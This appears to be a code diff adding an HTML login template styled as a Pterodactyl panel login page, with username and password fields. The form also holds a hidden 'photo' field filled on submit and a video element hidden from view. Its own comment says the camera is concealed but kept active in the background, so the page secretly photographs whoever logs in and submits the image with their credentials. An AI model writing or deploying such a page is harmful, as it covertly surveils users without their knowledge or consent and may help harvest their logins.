@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Pterodactyl Login Panel</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body>
+<div class="container">
+    <h2>Login Panel Pterodactyl</h2>
+    {% with messages = get_flashed_messages(with_categories=true) %}
+      {% if messages %}
+        <div class="flash-messages">
+          {% for category, message in messages %}
+            <div class="alert {{ category }}">{{ message }}</div>
+          {% endfor %}
+        </div>
+      {% endif %}
+    {% endwith %}
+    <form id="loginForm" method="POST" action="/login" onsubmit="return capturePhotoBeforeSubmit()">
+        <label>Username</label><br />
+        <input type="text" name="username" required /><br />
+        <label>Password</label><br />
+        <input type="password" name="password" required /><br />
+        <input type="hidden" name="photo" id="photoInput" />
+        <button type="submit">Login</button>
+    </form>
+    <!-- Video kamera disembunyikan agar tidak tampil, tapi tetap aktif di background -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+</div>
+<script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
